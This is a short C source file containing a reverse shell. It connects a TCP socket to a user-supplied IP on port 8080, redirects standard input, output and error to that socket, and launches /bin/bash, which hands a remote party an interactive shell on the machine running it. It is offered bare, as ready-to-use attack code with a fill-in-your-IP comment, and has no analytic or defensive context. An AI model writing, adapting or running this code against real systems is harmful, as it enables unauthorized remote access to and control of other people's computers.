#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(void)
{
	int sockt;
	int port=8080;
	struct sockaddr_in revsockaddr;
	sockt = socket(AF_INET, SOCK_STREAM,0);
	revsockaddr.sin_family = AF_INET;
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("PLACE IP"); # put your ip here 
	connect(sockt,(struct sockaddr *) &revsockaddr,sizeof(revsockaddr));
	dup2(sockt,0);
	dup2(sockt,1);
	dup2(sockt,2);
	char * const argv[] = {"bin/bash",NULL};
	execve("/bin/bash",argv,NULL);
	return 0;
}
